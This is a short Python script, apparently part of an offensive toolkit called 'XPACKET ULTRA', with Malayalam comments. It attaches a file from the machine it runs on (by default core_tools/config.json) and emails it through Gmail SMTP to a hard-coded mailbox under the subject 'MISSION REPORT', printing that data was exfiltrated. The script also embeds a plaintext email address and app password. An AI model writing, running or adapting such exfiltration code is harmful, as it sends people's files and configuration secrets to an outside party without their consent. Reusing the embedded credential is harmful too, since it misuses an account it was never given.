import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def send_report(target_name, report_path):
    # കറക്റ്റ് ആയ മെയിൽ ഐഡി ഇവിടെ നൽകുന്നു
    sender_email = "xrootaccess@gmail.com"
    receiver_email = "xrootaccess@gmail.com"
    
    # നീ ജനറേറ്റ് ചെയ്ത ആ പാസ്‌വേഡ്
    password = "uwcwdzlsjhuvlnda" 

    msg = MIMEMultipart()
    msg['From'] = f"X🔴PACKET™ ULTRA <{sender_email}>"
    msg['To'] = receiver_email
    msg['Subject'] = f"MISSION REPORT: {target_name}"
    
    body = f"Mission Complete.\nTarget: {target_name}\nIdentity: xrootaccess\n\nGenerated by XPACKET ULTRA v133.0"
    msg.attach(MIMEText(body, 'plain'))

    if os.path.exists(report_path):
        with open(report_path, "rb") as attachment:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(report_path)}")
            msg.attach(p)

    try:
        # SSL ഉപയോഗിച്ച് സെക്യൂർ കണക്ഷൻ
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, password)
        server.send_message(msg)
        server.quit()
        print("\n[+] SUCCESS: Data exfiltrated to xrootaccess@gmail.com")
    except Exception as e:
        print(f"\n[-] ERROR: {e}")

if __name__ == "__main__":
    import sys
    t = sys.argv[1] if len(sys.argv) > 1 else "X_MISSION"
    p = sys.argv[2] if len(sys.argv) > 2 else "core_tools/config.json"
    send_report(t, p)
